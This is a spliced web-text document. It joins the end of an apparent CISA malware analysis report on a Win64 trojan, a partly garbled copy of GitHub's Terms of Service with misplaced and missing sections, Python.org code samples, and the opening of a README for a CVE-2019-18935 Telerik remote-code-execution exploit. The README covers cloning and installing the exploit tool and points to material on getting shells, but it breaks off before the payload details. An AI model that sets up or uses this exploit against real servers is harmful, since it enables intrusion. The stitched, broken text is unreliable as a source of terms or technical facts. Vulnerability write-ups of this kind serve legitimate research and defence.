ssdeep | 1536:P6qfkBhbpqNOQiazS7pG5lnMnoJSsFnJ5yvd2+D5lUBHTyRcf01sW7d09dlmv5fB:P6qMfbM88zCpuNMnoDByvd2+D5lUBHTJ | | Entropy | 5.822163 |  Antivirus  | AhnLab | Malware/Win.Generic | | --- | --- | | Avira | TR/Agent.brfsc | | Bitdefender | Gen:Variant.Tedy.146424 | | Emsisoft | Gen:Variant.Tedy.146424 (B) | | ESET | a variant of Win64/Agent.AQS trojan | | IKARUS | Trojan.Win64.Agent | | K7 | Trojan ( 0057f7991 ) | | Zillya! | Trojan.Agent.Win64.8597 |  YARA Rules No matches found. ssdeep Matches No matches found.

strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.   * Maintain up-to-date antivirus signatures and engines. * Keep operating system patches up-to-date. * Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication. * Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required. * Enforce a strong password policy and implement regular password changes. * Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known. * Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests. * Disable unnecessary services on agency workstations and servers. * Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header). * Monitor users' web browsing habits; restrict access to sites with unfavorable content. * Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.). * Scan all software downloaded from the Internet prior to executing. * Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).   Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, **"Guide to Malware Incident Prevention & Handling for Desktops and Laptops".** Contact Information  * 1-888-282-0870 * CISA Central (UNCLASS) * CISA SIPR (SIPRNET) * CISA IC (JWICS)   CISA continuously strives to improve its products and services.

## [The GitHub Terms of Service](#the-github-terms-of-service)

Effective date: November 16, 2020

## [A. Definitions](#a-definitions)

**Short version:** *We use these basic terms throughout the agreement, and they have specific meanings. You should know what we mean when we use each of the terms. There's not going to be a test on it, but it's still useful information.*

1. An "Account" represents your legal relationship with GitHub. A “Personal Account” represents an individual User’s authorization to log in to and use the Service and serves as a User’s identity on GitHub. “Organizations” are shared workspaces that may be associated with a single entity or with one or more Users where multiple Users can collaborate across many projects at once. A Personal Account can be a member of any number of Organizations.
2. The “Agreement” refers, collectively, to all the terms, conditions, notices contained or referenced in this document (the “Terms of Service” or the "Terms") and all other operating rules, policies (including the GitHub Privacy Statement, available at [github.com/site/privacy](https://github.com/site/privacy)) and procedures that we may publish from time to time on the Website. Most of our site policies are available at [docs.github.com/categories/site-policy](/en/site-policy).
3. "Beta Previews" mean software, services, or features identified as alpha, beta, preview, early access, or evaluation, or words or phrases with similar meanings.
4. “Content” refers to content featured or displayed through the Website, including without limitation code, text, data, articles, images, photographs, graphics, software, applications, packages, designs, features, and other materials that are available on the Website or otherwise available through the Service. "Content" also includes Services. “User-Generated Content” is Content, written or otherwise, created or uploaded by our Users. "Your Content" is Content that you create or own.
5. “GitHub,” “We,” and “Us” refer to GitHub, Inc., as well as our affiliates, directors, subsidiaries, contractors, licensors, officers, agents, and employees.
6. The “Service” refers to the applications, software, products, and services provided by GitHub, including any Beta Previews.
7. “The User,” “You,” and “Your” refer to the individual person, company, or organization that has visited or is using the Website or Service; that accesses or uses any part of the Account; or that directs the use of the Account in the performance of its functions. A User must be at least 13 years of age. Special terms may apply for business or government Accounts (See [Section B(5): Additional Terms](#5-additional-terms)).
8. The “Website” refers to GitHub’s website located at [github.com](https://github.com/), and all content, services, and products provided by GitHub at or through the Website. It also refers to GitHub-owned subdomains of github.com, such as [education.github.com](https://education.github.com/) and [pages.github.com](https://pages.github.com/). These Terms also govern GitHub’s conference websites, such as [githubuniverse.com](https://githubuniverse.com/), and product websites, such as [electronjs.org](https://www.electronjs.org/). Occasionally, websites owned by GitHub may provide different or additional terms of service. If those additional terms conflict with this Agreement, the more specific terms apply to the relevant page or service.

## [B. Account Terms](#b-account-terms)

**Short version:** *Personal Accounts and Organizations have different administrative controls; a human must create your Account; you must be 13 or over; you must provide a valid email address; and you may not have more than one free Account. You alone are responsible for your Account and anything that happens while you are signed in to or using your Account. You are responsible for keeping your Account secure.*

### [1. Account Controls](#1-account-controls)

* Users. Subject to these Terms, you retain ultimate administrative control over your Personal Account and the Content within it.
* Organizations. The "owner" of an Organization that was created under these Terms has ultimate administrative control over that Organization and the Content within it. Within the Service, an owner can manage User access to the Organization’s data and projects. An Organization may have multiple owners, but there must be at least one Personal Account designated as an owner of an Organization. If you are the owner of an Organization under these Terms, we consider you responsible for the actions that are performed on or through that Organization.

### [2. Required Information](#2-required-information)

You must provide a valid email address in order to complete the signup process. Any other information requested, such as your real name, is optional, unless you are accepting these terms on behalf of a legal entity (in which case we need more information about the legal entity) or if you opt for a [paid Account](#k-payment), in which case additional information will be necessary for billing purposes.

### [3. Account Requirements](#3-account-requirements)

We have a few simple rules for Personal Accounts on GitHub's Service.

* You must be a human to create an Account. Accounts registered by "bots" or other automated methods are not permitted. We do permit machine accounts:
* A machine account is an Account set up by an individual human who accepts the Terms on behalf of the Account, provides a valid email address, and is responsible for its actions. A machine account is used exclusively for performing automated tasks. Multiple users may direct the actions of a machine account, but the owner of the Account is ultimately responsible for the machine's actions. You may maintain no more than one free machine account in addition to your free Personal Account.
* One person or legal entity may maintain no more than one free Account (if you choose to control a machine account as well, that's fine, but it can only be used for running a machine).
* You must be age 13 or older. While we are thrilled to see brilliant young coders get excited by learning to program, we must comply with United States law. GitHub does not target our Service to children under 13, and we do not permit any Users under 13 on our Service. If we learn of any User under the age of 13, we will [terminate that User’s Account immediately](#l-cancellation-and-termination). If you are a resident of a country outside the United States, your country’s minimum age may be older; in such a case, you are responsible for complying with your country’s laws.
* Your login may only be used by one person — i.e., a single login may not be shared by multiple people. A paid Organization may only provide access to as many Personal Accounts as your subscription allows.
* You may not use GitHub in violation of export control or sanctions laws of the United States or any other applicable jurisdiction. You may not use GitHub if you are or are working on behalf of a [Specially Designated National (SDN)](https://www.treasury.gov/resource-center/sanctions/SDN-List/Pages/default.aspx) or a person subject to similar blocking or denied party prohibitions administered by a U.S. government agency. GitHub may allow persons in certain sanctioned countries or territories to access certain GitHub services pursuant to U.S. government authorizations. For more information, please see our [Export Controls policy](/en/site-policy/other-site-policies/github-and-trade-controls).

### [4. Account Security](#4-account-security)

You are responsible for keeping your Account secure while you use our Service. We offer tools such as two-factor authentication to help you maintain your Account's security, but the content of your Account and its security are up to you.

* You are responsible for all content posted and activity that occurs under your Account (even when content is posted by others who have Accounts under your Account).
* You are responsible for maintaining the security of your Account and password. GitHub cannot and will not be liable for any loss or damage from your failure to comply with this security obligation.
* You will promptly notify GitHub by contacting us through the [GitHub Support portal](https://support.github.com/) if you become aware of any unauthorized use of, or access to, our Service through your Account, including any unauthorized use of your password or Account.

### [5. Additional Terms](#5-additional-terms)

In some situations, third parties' terms may apply to your use of GitHub. For example, you may be a member of an organization on GitHub with its own terms or license agreements; you may download an application that integrates with GitHub; or you may use GitHub to authenticate to another service. Please be aware that while these Terms are our full agreement with you, other parties' terms govern their relationships with you.

If you are a government User or otherwise accessing or using any GitHub Service in a government capacity, this [Government Amendment to GitHub Terms of Service](/en/site-policy/site-policy-deprecated/amendment-to-github-terms-of-service-applicable-to-us-federal-government-users) applies to you, and you agree to its provisions.

If you have signed up for GitHub Enterprise Cloud, the [Enterprise Cloud Addendum](/en/site-policy/site-policy-deprecated/github-enterprise-service-level-agreement) applies to you, and you agree to its provisions.

## [C. Acceptable Use](#c-acceptable-use)

**Short version:** *GitHub hosts a wide variety of collaborative projects from all over the world, and that collaboration only works when our users are able to work together in good faith. While using the service, you must follow the terms of this section, which include some restrictions on content you can post, conduct on the service, and other limitations. In short, be excellent to each other.*

Your use of the Website and Service must not violate any applicable laws, including copyright or trademark laws, export control or sanctions laws, or other laws in your jurisdiction. You are responsible for making sure that your use of the Service is in compliance with laws and any applicable regulations.

You agree that you will not under any circumstances violate our [Acceptable Use Policies](/en/site-policy/acceptable-use-policies/github-acceptable-use-policies) or [Community Guidelines](/en/site-policy/github-terms/github-community-guidelines).

## [D. User-Generated Content](#d-user-generated-content)

**Short version:** *You own content you create, but you allow us certain rights to it, so that we can display and share the content you post. You still have control over your content, and responsibility for it, and the rights you grant us are limited to those we need to provide the service. We have the right to remove content or close Accounts if we need to.*

### [1. Responsibility for User-Generated Content](#1-responsibility-for-user-generated-content)

You may create or upload User-Generated Content while using the Service. You are solely responsible for the content of, and for any harm resulting from, any User-Generated Content that you post, upload, link to or otherwise make available via the Service, regardless of the form of that Content. We are not responsible for any public display or misuse of your User-Generated Content.

### [2. GitHub May Remove Content](#2-github-may-remove-content)

We have the right to refuse or remove any User-Generated Content that, in our sole discretion, violates any laws or [GitHub terms or policies](/en/site-policy). User-Generated Content displayed on GitHub Mobile may be subject to mobile app stores' additional terms.

### [3. Ownership of Content, Right to Post, and License Grants](#3-ownership-of-content-right-to-post-and-license-grants)

You retain ownership of and responsibility for Your Content. If you're posting anything you did not create yourself or do not own the rights to, you agree that you are responsible for any Content you post; that you will only submit Content that you have the right to post; and that you will fully comply with any third party licenses relating to Content you post.

Because you retain ownership of and responsibility for Your Content, we need you to grant us — and other GitHub Users — certain legal permissions, listed in Sections D.4 — D.7. These license grants apply to Your Content. If you upload Content that already comes with a license granting GitHub the permissions we need to run our Service, no additional license is required. You understand that you will not receive any payment for any of the rights granted in Sections D.4 — D.7. The licenses you grant to us will end when you remove Your Content from our servers, unless other Users have forked it.

### [4. License Grant to Us](#4-license-grant-to-us)

We need the legal right to do things like host Your Content, publish it, and share it. You grant us and our legal successors the right to store, archive, parse, and display Your Content, and make incidental copies, as necessary to provide the Service, including improving the Service over time. This license includes the right to do things like copy it to our database and make backups; show it to you and other users; parse it into a search index or otherwise analyze it on our servers; share it with other users; and perform it, in case Your Content is something like music or video.

This license does not grant GitHub the right to sell Your Content. It also does not grant GitHub the right to otherwise distribute or use Your Content outside of our provision of the Service, except that as part of the right to archive Your Content, GitHub may permit our partners to store and archive Your Content in public repositories in connection with the [GitHub Arctic Code Vault and GitHub Archive Program](https://archiveprogram.github.com/).

### [5. License Grant to Other Users](#5-license-grant-to-other-users)

Any User-Generated Content you post publicly, including issues, comments, and contributions to other Users' repositories, may be viewed by others. By setting your repositories to be viewed publicly, you agree to allow others to view and "fork" your repositories (this means that others may make their own copies of Content from your repositories in repositories they control).

If you set your pages and repositories to be viewed publicly, you grant each User of GitHub a nonexclusive, worldwide license to use, display, and perform Your Content through the GitHub Service and to reproduce Your Content solely on GitHub as permitted through GitHub's functionality (for example, through forking). You may grant further rights if you [adopt a license](/en/communities/setting-up-your-project-for-healthy-contributions/adding-a-license-to-a-repository#including-an-open-source-license-in-your-repository). If you are uploading Content you did not create or own, you are responsible for ensuring that the Content you upload is licensed under terms that grant these permissions to other GitHub Users.

### [6. Contributions Under Repository License](#6-contributions-under-repository-license)

Whenever you add Content to a repository containing notice of a license, you license that Content under the same terms, and you agree that you have the right to license that Content under those terms. If you have a separate agreement to license that Content under different terms, such as a contributor license agreement, that agreement will supersede.

Isn't this just how it works already? Yep. This is widely accepted as the norm in the open-source community; it's commonly referred to by the shorthand "inbound=outbound". We're just making it explicit.

### [7. Moral Rights](#7-moral-rights)

You retain all moral rights to Your Content that you upload, publish, or submit to any part of the Service, including the rights of integrity and attribution. However, you waive these rights and agree not to assert them against us, to enable us to reasonably exercise the rights granted in Section D.4, but not otherwise.

To the extent this agreement is not enforceable by applicable law, you grant GitHub the rights we need to use Your Content without attribution and to make reasonable adaptations of Your Content as necessary to render the Website and provide the Service.

## [E. Private Repositories](#e-private-repositories)

**Short version:** *We treat the content of private repositories as confidential, and we only access it as described in our Privacy Statement—for security purposes, to assist the repository owner with a support matter, to maintain the integrity of the Service, to comply with our legal obligations, if we have reason to believe the contents are in violation of the law, or with your consent.*

### [1. Control of Private Repositories](#1-control-of-private-repositories)

Some Accounts may have private repositories, which allow the User to control access to Content.

### [2. Confidentiality of Private Repositories](#2-confidentiality-of-private-repositories)

GitHub considers the contents of private repositories to be confidential to you. GitHub will protect the contents of private repositories from unauthorized use, access, or disclosure in the same manner that we would use to protect our own confidential information of a similar nature and in no event with less than a reasonable degree of care.

### [3. Access](#3-access)

GitHub personnel may only access the content of your private repositories in the situations described in our [Privacy Statement](/en/site-policy/privacy-policies/github-privacy-statement#repository-contents).

You may choose to enable additional access to your private repositories. For example:

* You may enable various GitHub services or features that require additional rights to Your Content in private repositories. These rights may vary depending on the service or feature, but GitHub will continue to treat your private repository Content as confidential. If those services or features require rights in addition to those we need to provide the GitHub Service, we will provide an explanation of those rights.

Additionally, we may be [compelled by law](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure) to disclose the contents of your private repositories.

GitHub will provide notice regarding our access to private repository content, unless [for legal disclosure](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure), to comply with our legal obligations, or where otherwise bound by requirements under law, for automated scanning, or if in response to a security threat or other risk to security.

## [F. Copyright Infringement and DMCA Policy](#f-copyright-infringement-and-dmca-policy)

If you believe that content on our website violates your copyright, please contact us in accordance with our [Digital Millennium Copyright Act Policy](/en/site-policy/content-removal-policies/dmca-takedown-policy). If you are a copyright owner and you believe that content on GitHub violates your rights, please contact us via [our convenient DMCA form](https://github.com/contact/dmca) or by emailing copyright@github.com. There may be legal consequences for sending a false or frivolous takedown notice. Before sending a takedown request, you must consider legal uses such as fair use and licensed uses.

We will terminate the Accounts of [repeat infringers](/en/site-policy/content-removal-policies/dmca-takedown-policy#e-repeated-infringement) of this policy.

## [G. Intellectual Property Notice](#g-intellectual-property-notice)

**Short version:** *We own the service and all of our content. In order for you to use our content, we give you certain rights to it, but you may only use our content in the way we have allowed.*

### [1. GitHub's Rights to Content](#1-githubs-rights-to-content)

GitHub and our licensors, vendors, agents, and/or our content providers retain ownership of all intellectual property rights of any kind related to the Website and Service. We reserve all rights that are not expressly granted to you under this Agreement or by law. The look and feel of the Website and Service is copyright © GitHub, Inc. All rights reserved. You may not duplicate, copy, or reuse any portion of the HTML/CSS, JavaScript, or visual design elements or concepts without express written permission from GitHub.

### [2. GitHub Trademarks and Logos](#2-github-trademarks-and-logos)

If you’d like to use GitHub’s trademarks, you must follow all of our trademark guidelines, including those on our logos page: <https://github.com/logos>.

### [3. License to GitHub Policies](#3-license-to-github-policies)

This Agreement is licensed under this [Creative Commons Zero license](https://creativecommons.org/publicdomain/zero/1.0/). For details, see our [site-policy repository](https://github.com/github/site-policy#license).

## [H. API Terms](#h-api-terms)

**Short version:** *You agree to these Terms of Service, plus this Section H, when using any of GitHub's APIs (Application Provider Interface), including use of the API through a third party product that accesses GitHub.*

Abuse or excessively frequent requests to GitHub via the API may result in the temporary or permanent suspension of your Account's access to the API. GitHub, in our sole discretion, will determine abuse or excessive usage of the API. We will make a reasonable attempt to warn you via email prior to suspension.

You may not share API tokens to exceed GitHub's rate limitations.

You may not use the API to download data or Content from GitHub for spamming purposes, including for the purposes of selling GitHub users' personal information, such as to recruiters, headhunters, and job boards.

All use of the GitHub API is subject to these Terms of Service and the [GitHub Privacy Statement](https://github.com/site/privacy).

GitHub may offer subscription-based access to our API for those Users who require high-throughput access or access that would result in resale of GitHub's Service.

## [I. GitHub Additional Product Terms](#i-github-additional-product-terms)

**Short version:** *You need to follow certain specific terms and conditions for GitHub's various features and products, and you agree to the Supplemental Terms and Conditions when you agree to this Agreement.*

Some Service features may be subject to additional terms specific to that feature or product as set forth in the GitHub Additional Product Terms. By accessing or using the Services, you also agree to the [GitHub Additional Product Terms](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

## [J. Beta Previews](#j-beta-previews)

**Short version:** *Beta Previews may not be supported or may change at any time. You may receive confidential information through those programs that must remain confidential while the program is private. We'd love your feedback to make our Beta Previews better.*

### [1. Subject to Change](#1-subject-to-change)

Beta Previews may not be supported and may be changed at any time without notice. In addition, Beta Previews are not subject to the same security measures and auditing to which the Service has been and is subject. **By using a Beta Preview, you use it at your own risk.**

### [2. Confidentiality](#2-confidentiality)

As a user of Beta Previews, you may get access to special information that isn’t available to the rest of the world. Due to the sensitive nature of this information, it’s important for us to make sure that you keep that information secret.

**Confidentiality Obligations.** You agree that any non-public Beta Preview information we give you, such as information about a private Beta Preview, will be considered GitHub’s confidential information (collectively, “Confidential Information”), regardless of whether it is marked or identified as such. You agree to only use such Confidential Information for the express purpose of testing and evaluating the Beta Preview (the “Purpose”), and not for any other purpose. You should use the same degree of care as you would with your own confidential information, but no less than reasonable precautions to prevent any unauthorized use, disclosure, publication, or dissemination of our Confidential Information. You promise not to disclose, publish, or disseminate any Confidential Information to any third party, unless we don’t otherwise prohibit or restrict such disclosure (for example, you might be part of a GitHub-organized group discussion about a private Beta Preview feature).

**Exceptions.** Confidential Information will not include information that is: (a) or becomes publicly available without breach of this Agreement through no act or inaction on your part (such as when a private Beta Preview becomes a public Beta Preview); (b) known to you before we disclose it to you; (c) independently developed by you without breach of any confidentiality obligation to us or any third party; or (d) disclosed with permission from GitHub. You will not violate the terms of this Agreement if you are required to disclose Confidential Information pursuant to operation of law, provided GitHub has been given reasonable advance written notice to object, unless prohibited by law.

### [3. Feedback](#3-feedback)

We’re always trying to improve of products and services, and your feedback as a Beta Preview user will help us do that. If you choose to give us any ideas, know-how, algorithms, code contributions, suggestions, enhancement requests, recommendations or any other feedback for our products or services (collectively, “Feedback”), you acknowledge and agree that GitHub will have a royalty-free, fully paid-up, worldwide, transferable, sub-licensable, irrevocable and perpetual license to implement, use, modify, commercially exploit and/or incorporate the Feedback into our products, services, and documentation.

## [K. Payment](#k-payment)

**Short version:** *You are responsible for any fees associated with your use of GitHub. We are responsible for communicating those fees to you clearly and accurately, and letting you know well in advance if those prices change.*

### [1. Pricing](#1-pricing)

Our pricing and payment terms are available at [github.com/pricing](https://github.com/pricing). If you agree to a subscription price, that will remain your price for the duration of the payment term; however, prices are subject to change at the end of a payment term.

### [2. Upgrades, Downgrades, and Changes](#2-upgrades-downgrades-and-changes)

* We will immediately bill you when you upgrade from the free plan to any paying plan.
* If you change from a monthly billing plan to a yearly billing plan, GitHub will bill you for a full year at the next monthly billing date.
* If you upgrade to a higher level of service, we will bill you for the upgraded plan immediately.
* You may change your level of service at any time by [choosing a plan option](https://github.com/pricing) or going into your [Billing settings](https://github.com/settings/billing). If you choose to downgrade your Account, you may lose access to Content, features, or capacity of your Account. Please see our section on [Cancellation](#l-cancellation-and-termination) for information on getting a copy of that Content.

### [3. Billing Schedule; No Refunds](#3-billing-schedule-no-refunds)

**Payment Based on Plan** For monthly or yearly payment plans, the Service is billed in advance on a monthly or yearly basis respectively and is non-refundable. There will be no refunds or credits for partial months of service, downgrade refunds, or refunds for months unused with an open Account; however, the service will remain active for the length of the paid billing period. In order to treat everyone equally, no exceptions will be made.

**Payment Based on Usage** Some Service features are billed based on your usage. A limited quantity of these Service features may be included in your plan for a limited term without additional charge. If you choose to use paid Service features beyond the quantity included in your plan, you pay for those Service features based on your actual usage in the preceding month. Monthly payment for these purchases will be charged on a periodic basis in arrears. See [GitHub Additional Product Terms for Details](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

**Invoicing** For invoiced Users, User agrees to pay the fees in full, up front without deduction or setoff of any kind, in U.S. Dollars. User must pay the fees within thirty (30) days of the GitHub invoice date. Amounts payable under this Agreement are non-refundable, except as otherwise provided in this Agreement. If User fails to pay any fees on time, GitHub reserves the right, in addition to taking any other action at law or equity, to (i) charge interest on past due amounts at 1.0% per month or the highest interest rate allowed by law, whichever is less, and to charge all expenses of recovery, and (ii) terminate the applicable order form. User is solely responsible for all taxes, fees, duties and governmental assessments (except for taxes based on GitHub's net income) that are imposed or become due in connection with this Agreement.

### [4. Authorization](#4-authorization)

By agreeing to these Terms, you are giving us permission to charge your on-file credit card, PayPal account, or other approved methods of payment for fees that you authorize for GitHub.

### [5. Responsibility for Payment](#5-responsibility-for-payment)

You are responsible for all fees, including taxes, associated with your use of the Service. By using the Service, you agree to pay GitHub any charge incurred in connection with your use of the Service. If you dispute the matter, contact us through the [GitHub Support portal](https://support.github.com/). You are responsible for providing us with a valid means of payment for paid Accounts. Free Accounts are not required to provide payment information.

## [L. Cancellation and Termination](#l-cancellation-and-termination)

**Short version:** *You may close your Account at any time. If you do, we'll treat your information responsibly.*

### [1. Account Cancellation](#1-account-cancellation)

It is your responsibility to properly cancel your Account with GitHub. You can [cancel your Account at any time](/en/billing/managing-the-plan-for-your-github-account/downgrading-your-accounts-plan) by going into your Settings in the global navigation bar at the top of the screen. The Account screen provides a simple, no questions asked cancellation link. We are not able to cancel Accounts in response to an email or phone request.

### [2. Upon Cancellation](#2-upon-cancellation)

We will retain and use your information as necessary to comply with our legal obligations, resolve disputes, and enforce our agreements, but barring legal requirements, we will delete your full profile and the Content of your repositories within 90 days of cancellation or termination (though some information may remain in encrypted backups). This information cannot be recovered once your Account is canceled.

We will not delete Content that you have contributed to other Users' repositories or that other Users have forked.

Upon request, we will make a reasonable effort to provide an Account owner with a copy of your lawful, non-infringing Account contents after Account cancellation, termination, or downgrade. You must make this request within 90 days of cancellation, termination, or downgrade.

### [3. GitHub May Terminate](#3-github-may-terminate)

GitHub has the right to suspend or terminate your access to all or any part of the Website at any time, with or without cause, with or without notice, effective immediately. GitHub reserves the right to refuse service to anyone for any reason at any time.

### [4. Survival](#4-survival)

All provisions of this Agreement which, by their nature, should survive termination *will* survive termination — including, without limitation: ownership provisions, warranty disclaimers, indemnity, and limitations of liability.

## [M. Communications with GitHub](#m-communications-with-github)

**Short version:** *We use email and other electronic means to stay in touch with our users.*

### [1. Electronic Communication Required](#1-electronic-communication-required)

GitHub provides the Website and the Service “as is” and “as available,” without warranty of any kind. Without limiting this, we expressly disclaim all warranties, whether express, implied or statutory, regarding the Website and the Service including without limitation any warranty of merchantability, fitness for a particular purpose, title, security, accuracy and non-infringement.

You assume full responsibility and risk of loss resulting from your downloading and/or use of files, information, content or other material obtained from the Service.

## [O. Limitation of Liability](#o-limitation-of-liability)

**Short version:** *We will not be liable for damages or losses arising from your use or inability to use the service or otherwise arising under this agreement. Please read this section carefully; it limits our obligations to you.*

You understand and agree that we will not be liable to you or any third party for any loss of profits, use, goodwill, or data, or for any incidental, indirect, special, consequential or exemplary damages, however arising, that result from

## [P. Release and Indemnification](#p-release-and-indemnification)

**Short version:** *You are responsible for your use of the service. If you harm someone else or get into a dispute with someone else, we will not be involved.*

If you have a dispute with one or more Users, you agree to release GitHub from any and all claims, demands and damages (actual and consequential) of every kind and nature, known and unknown, arising out of or in any way connected with such disputes.

You agree to indemnify us, defend us, and hold us harmless from and against any and all claims, liabilities, and expenses, including attorneys’ fees, arising out of your use of the Website and the Service, including but not limited to your violation of this Agreement, provided that GitHub (1) promptly gives you written notice of the claim, demand, suit or proceeding; (2) gives you sole control of the defense and settlement of the claim, demand, suit or proceeding (provided that you may not settle any claim, demand, suit or proceeding unless the settlement unconditionally releases GitHub of all liability); and (3) provides to you all reasonable assistance, at your expense.

## [Q. Changes to These Terms](#q-changes-to-these-terms)

**Short version:** *We want our users to be informed of important changes to our terms, but some changes aren't that important — we don't want to bother you every time we fix a typo. So while we may modify this agreement at any time, we will notify users of any material changes and give you time to adjust to them.*

We reserve the right, at our sole discretion, to amend these Terms of Service at any time and will update these Terms of Service in the event of any such amendments. We will notify our Users of material changes to this Agreement, such as price increases, at least 30 days prior to the change taking effect by posting a notice on our Website or sending email to the primary email address specified in your GitHub account. Customer's continued use of the Service after those 30 days constitutes agreement to those revisions of this Agreement. For any other modifications, your continued use of the Website constitutes agreement to our revisions of these Terms of Service. You can view all changes to these Terms in our [Site Policy](https://github.com/github/site-policy) repository.

We reserve the right at any time and from time to time to modify or discontinue, temporarily or permanently, the Website (or any part of it) with or without notice.

You and GitHub agree to submit to the exclusive jurisdiction and venue of the courts located in the City and County of San Francisco, California.

### [2. Non-Assignability](#2-non-assignability)

### [4. Severability, No Waiver, and Survival](#4-severability-no-waiver-and-survival)

If any part of this Agreement is held invalid or unenforceable, that portion of the Agreement will be construed to reflect the parties’ original intent. The remaining portions will remain in full force and effect. Any failure on the part of GitHub to enforce any provision of this Agreement will not be considered a waiver of our right to enforce such provision. Our rights under this Agreement will survive any termination of this Agreement.

### [5. Amendments; Complete Agreement](#5-amendments-complete-agreement)

  # Python 3: Fibonacci series up to n
  >>> def fib(n):
  >>>     a, b = 0, 1
  >>>     while a < n:
  >>>         print(a, end=' ')
  >>>         a, b = b, a+b

  ```

  # Functions Defined

  The core of extensible programming is defining functions. Python allows mandatory and optional arguments, keyword arguments, and even arbitrary argument lists. [More about defining functions in Python 3](//docs.python.org/3/tutorial/controlflow.html#defining-functions)
* ```
  # Python 3: List comprehensions
  >>> fruits = ['Banana', 'Apple', 'Lime']
  >>> loud_fruits = [fruit.upper() for fruit in fruits]
  >>> print(loud_fruits)
  ['BANANA', 'APPLE', 'LIME']

  # List and the enumerate function
  >>> list(enumerate(fruits))
  [(0, 'Banana'), (1, 'Apple'), (2, 'Lime')]
  ```

  # Compound Data Types

  Lists (known as arrays in other languages) are one of the compound data types that Python understands. Lists can be indexed, sliced and manipulated with other built-in functions. [More about lists in Python 3](//docs.python.org/3/tutorial/introduction.html#lists)
* ```
  # Python 3: Simple arithmetic
  >>> 1 / 2
  0.5
  >>> 2 ** 3
  8
  >>> 17 / 3  # classic division returns a float
  5.666666666666667
  >>> 17 // 3  # floor division
  5
  ```

  # Intuitive Interpretation

  Calculations are simple with Python, and expression syntax is straightforward: the operators `+`, `-`, `*` and `/` work as expected; parentheses `()` can be used for grouping. [More about simple math functions in Python 3](http://docs.python.org/3/tutorial/introduction.html#using-python-as-a-calculator).
* ```
  # For loop on a list
  >>> numbers = [2, 4, 6, 8]
  >>> product = 1
  >>> for number in numbers:
  ...    product = product * number
  ...
  >>> print('The product is:', product)
  The product is: 384
  ```

  # All the Flow You’d Expect

  Python knows the usual control flow statements that other languages speak — `if`, `for`, `while` and `range` — with some of its own twists, of course. [More control flow tools in Python 3](//docs.python.org/3/tutorial/controlflow.html)
* ```
  # Simple output (with Unicode)
  >>> print("Hello, I'm Python!")
  Hello, I'm Python!
  # Input, assignment
  >>> name = input('What is your name?\n')
  What is your name?
  Python
  >>> print(f'Hi, {name}.')
  Hi, Python.

  ```

> [Prioritizing cutting-edge speed and supporting the rapid growth of Hudson River Trading’s codebase can have unintended effects that require innovative solutions. For those working on our Python codebase, this means addressing “code tangling,” the coupling of unrelated code through unintuitive import cycles. In this article, George Farcasiu, Noah Kim, Jacob Brugh, and Jiahao Li discuss how they mitigate the cost and time burden of this issue by creating new tools to analyze and untangle dependencies efficiently.](/success-stories/building-a-dependency-graph-of-our-python-codebase/)

## Description

[Telerik UI for ASP.NET AJAX](https://www.telerik.com/products/aspnet-ajax.aspx) is a widely used suite of UI components for web applications. It insecurely deserializes JSON objects in a manner that results in arbitrary remote code execution on the software's underlying host. For more information, see:

* The DerpCon talk [.NET Roulette](https://www.youtube.com/watch?v=--6PiuvBGAU) ([slides](https://know.bishopfox.com/cs/c/?cta_guid=80aa4ac9-84b9-45a4-9cf3-9f215e3f714a&placement_guid=f9ff0e1a-d44c-42ce-8be3-480356af7dc7&portal_id=5632775&canon=https%3A%2F%2Fknow.bishopfox.com%2Fevents%2Fbarrett-darnell-to-present-at-derpcon&redirect_url=APefjpGudybbT_RflCPD6bnEJCJeiyJQwOw2sIK_LZsJpPzGa3E7Q0zgcY2tAhXlkopDbQCzU_G0nEWApdZDnvmHG0BXZdg3RVqaDZTM7kRj-B-MgSRZtZf3sBb_IpKbpAYruI5qNjK-squ1hOQ-Ubq5hoeoYk8B_kwsDSuP7dyoJA5jUMpOdLd6GMURDLATA5GJfm0sOzClndse_fbJg10zBRMQ-byd_ikGcy3ttuQMBRJXkKHPCDFTMp5tODRK66YwFDGfL16GHjOiKLim0ORMvYzyCjOr6RS0qMUDfRbywQIcMWrd7hKI7XiphcZOXf7JcsstSrHn&click=a3983a0a-2932-41a5-b67f-deb4eee8a399&hsutk=2fd63671b84547f0be515dffcd468a6e&signature=AAH58kGXBfVBLDcwiB-xjb6tdRfjxsQXSw&pageId=28318760929&contentType=blog-post&__hstc=24978341.2fd63671b84547f0be515dffcd468a6e.1592575907261.1592575907261.1592575907261.1&__hssc=24978341.1.1592575907263&__hsfp=1563242614)) which details extra fundamentals about exploiting insecure deserialization, applies that to this exploit, and walks through some tips and tricks for getting shells on ASP.NET web applications.
* The [full write-up](https://hubs.ly/H0mfk7r0) at Bishop Fox, including a complete walkthrough of this vulnerability and exploit details for this issue (along with patching instructions).

## Getting started

### Prerequisites

You'll need [Visual Studio](https://visualstudio.microsoft.com/downloads/) and [.NET Framework SDK](https://dotnet.microsoft.com/download/visual-studio-sdks#:~:text=NET%20Standard%20article.-,.NET%20Framework,-.NET%20Framework%20is) installed to compile mixed-mode .NET assembly DLL payloads using `build-dll.bat`.

### Install

```
git clone https://github.com/noperator/CVE-2019-18935.git && cd CVE-2019-18935
python3 -m venv env
source env/bin/activate
python3 -m pip install -U pip
python3 -m pip install -r requirements.txt
```

This exploit leverages encryption logic from [RAU\_crypto](https://github.com/bao7uo/RAU_crypto). The `RAUCipher` class within `RAU_crypto.py` depends on PyCryptodome, a drop-in [replacement](https://blog.sqreen.com/stop-using-pycrypto-use-pycryptodome/) for the [dead](https://github.com/dlitz/pycrypto/issues/238) PyCrypto module. PyCryptodome and PyCrypto create problems when installed in the same environment, so the best way to satisfy this dependency is to install the module within a virtual environment, as shown above.

### Configure

